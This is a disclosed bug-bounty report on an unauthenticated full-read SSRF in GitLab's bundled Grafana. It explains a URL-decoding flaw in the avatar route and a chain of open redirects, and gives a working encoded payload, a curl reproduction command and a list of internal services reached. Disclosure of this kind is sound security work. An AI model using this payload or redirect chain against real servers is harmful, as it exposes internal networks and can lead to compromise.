---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/server-side-request-forgery-ssrf
  - env/web
  - stack/gitlab
  - vuln/ssrf
  - vuln/open-redirect
  - vuln/misconfiguration
  - impact/rce
substate: "resolved"
weakness: "Server-Side Request Forgery (SSRF)"
enriched: true
body: true
date: 2020-08-07
submitted: 2020-05-20T13:47:25.959Z
bounty_usd: null
votes: 229
cve: []
program: "[[programs/gitlab|GitLab]]"
reporter: "rhynorater"
source: "https://hackerone.com/reports/878779"
title: "Full Read SSRF on Gitlab's Internal Grafana"
---
# Full Read SSRF on Gitlab's Internal Grafana

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 229 | **Program:** GitLab | **Disclosed:** 2020-08-07

- Report: [https://hackerone.com/reports/878779](https://hackerone.com/reports/878779)
- CWE: Server-Side Request Forgery (SSRF)
- Submitted: 2020-05-20T13:47:25.959Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Apparently, Grafana is bundled with Gitlab by default. So the grafana instance that is accessible via `/-/grafana/`is vulnerable to the SSRF outlined below.

## Summary
By chaining together some redirects and a URL decoding bug, it is possible to achieve a full-read, unauthenticated, SSRF from your Grafana instance. It is possible to recreate this bug on `dev.gitlab.org/-/grafana`. 

## Details
In the grafana source code, the following route is defined:
```
	r.Get("/avatar/:hash", avatarCacheServer.Handler)
```
This route takes the hash from under `/avatar/:hash` and routes it to `secure.grafana.com` in order to access a user's gravatar image. The code that does this looks like this:
```
const (
	gravatarSource = "https://secure.gravatar.com/avatar/"
)
...
case err = <-thunder.GoFetch(gravatarSource+this.hash+"?"+this.reqParams, this):
```
The `this.hash` referenced in this code is the hash passed in via `/avatar/:hash` **URL Decoded**. The fact that this `:hash` is URL Decoded allows us to smuggle in our own parameters into this request. On `secure.gravatar.com`, if you supply the `d` parameter, it allows for redirection to `i0.wp.com` where some of the images are hosted. This is the first redirect in the redirect chain.

In order to get from `i0.wp.com` to any arbitrary host, quite a lot of investigation into this domain had to be performed. In the end, the open redirect achieved due to some improper redirect validation. The format of urls on `i0.wp.com` are as follows `i0.wp.com/{domainOfImage}/{pathOfImage}`. It seems that `i0.wp.com` wanted to offload some of its image hosting to `.bp.blogspot.com` whenever possible, so for any host whose domain was `*.bp.blogspot.com`, `i0.wp.com` would redirect to that host in order to avoid serving the image. However, after many long hours of investigation, it was discovered that it is possible to turn this into an open redirect using the following form:
```
http://i0.wp.com/google.com/1.bp.blogspot.com/
```
By using this trick it is possible to create a redirection chain that goes like this:
```
https://secure.gravatar.com/avatar/anything?d=/google.com/1.bp.blogspot.com/
->
http://i0.wp.com/google.com/1.bp.blogspot.com/
->
https://google.com/1.bp.blogspot.com
```

Finally, using this it is possible to create the SSRF using the following payload:
```
https://dev.gitlab.org/-/grafana/avatar/tesata%3fd%3dredirect.rhynorater.com%252f1.bp.blogspot.com%252fYOURHOSTHERE%26cachebust
```
(`redirect.rhynorater.com` is configured to redirect to any host provided after the `1.bp.blogspot.com` directory)

## Steps to Reproduce
Run the following `curl` command:
```
curl "https://dev.gitlab.org/-/grafana/avatar/test%3fd%3dredirect.rhynorater.com%252f1.bp.blogspot.com%252fpoc.rhynorater.com%26cachebust"
```

## Remediation
In order to remediate this bug one must either take the Grafana instance inside the internal network or WAF off the `/avatar/` endpoint.

## Impact

Full read, unauthenticated SSRF. This can result in RCE in many environments due to cloud misconfigurations

## Timeline

- **Report Filed**
- **2020-05-20** @rhynorater: Please add nnwakelam to the report as well.
- **2020-05-20** @rhynorater: This also affects gitlab infrastructure, as demonstrated from the above on `dev.gitlab.org`.
- **2020-05-20** @gitlab-securitybot: Hi @rhynorater,

Thank you for submitting this report. We will investigate the issue as soon as possible.
Due to our current workload, we will get back within 20 business days with an update.

Please refrain from submitting your report or inquiring about its status through
additional channels, as this unnecessarily binds resources in the security team.

Best regards,
GitLab Security Team
- **2020-05-20** @rhynorater: We were able to hit port `3903` on localhost and get access to the `mtail` service there:
```
HTTP/1.1 200 OK
Server: nginx
Date: Wed, 20 May 2020 14:43:55 GMT
Content-Type: image/jpeg
Content-Length: 144786
Connection: close
Cache-Control: private, max-age=3600
Cache-Control: no-cache
Expires: -1
Pragma: no-cache
X-Frame-Options: deny
Strict-Transport-Security: max-age=31536000
Referrer-Policy: strict-origin-when-cross-origin


<html>
<head>
<title>mtail on :3903</title>
</head>
<body>
<h1>mtail on :3903</h1>
<p>Build: mtail version v3.0.0-rc35 git revision a33283598c4b7a70fc2f113680318f29d5826cca go version go1.14 go arch amd64 go os linux</p>
<p>Metrics: <a href="/json">json</a>, <a href="/metrics">prometheus</a>, <a href="/varz">varz</a></p>
<p>Debug: <a href="/debug/pprof">debug/pprof</a>, <a href="/debug/vars">debug/vars</a>, <a href="/tracez">tracez</a>, <a href="/progz">progz</a></p>

```
- **2020-05-20** @rhynorater: Alertmanager on 9093
Node Exporter on 9100
Postgres Exporter on 9187
Redis Exporter on 9121
Consul Agent on 8500
Prometheus Time Series Collection and Processing Server on 9090
- **Report Triaged**
- **Bounty Awarded**
- **External User Joined**
- **2020-05-20** @nnwakelam: Can I attempt to escalate this to a critical?
- **2020-05-21** @rhynorater: ### NOTE: Please do not disclose this bug to anyone besides the required people on your team. Grafana is currently working on a fix.
- **2020-05-22** @gitlab_cmaxim: Hello @nnwakelam, 

> nnwakelam posted a comment.	May 20th (2 days ago)
Can I attempt to escalate this to a critical?

There is no need for this. After doing an internal assessment we concluded that this issue is  `Critical` and we are working on adding mitigations for this.

Thank you for you help and patience.

Regards,
Costel
- **2020-05-22** @nnwakelam: Great! Thanks.
- **2020-05-25** @gitlab-securitybot: ETA for fix:

Hi @rhynorater,

The issue you reported is currently scheduled to be fixed by 2020-07-31.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **2020-05-29** @rhynorater: I was able to escalate this in my local lab using the grafana-image-renderer plugin. By forcing the internal grafana-image-renderer plugin to render my URL, I was able to have it perform any actions defined by my web page including SSRF of all HTTP Verbs, ect...
- **2020-05-29** @gitlab_cmaxim: Hello @rhynorater, 

Thanks for the update. If possible please do a retest using the last release 13.0.1 and let us know if you can reproduce this issue.

Regards,
Costel
- **2020-05-29** @rhynorater: @gitlab_cmaxim is dev.gitlab.org on that release?
- **2020-05-29** @gitlab_cmaxim: @rhynorater For the moment try to reproduce this on your env using 13.0.1: 
>I was able to escalate this in my local lab using the grafana-image-renderer plugin. By forcing the internal grafana-image-renderer plugin to render my URL, I was able to have it perform any actions defined by my web page including SSRF of all HTTP Verbs, ect...

Thanks,
Costel
- **2020-05-29** @rhynorater: I have verified the fix in 13.0.1!
- **2020-05-29** @gitlab_cmaxim: @rhynorater: Give it a try o dev.gitlab.com and if it works please let us know what payload you used.

Thanks,
Costel
- **Bounty Awarded**
- **Report Resolved**
- **2020-06-26** @rhynorater: Ey! Thank you for the bounty! :)
- **2020-06-26** @nnwakelam: Thank you!
- **Agreed On Going Public**
- **2020-07-20** @gitlab_cmaxim: Sure! Please ping us after your talk.

Regards,
Costel
- **Agreed On Going Public**
- **Report Became Public**
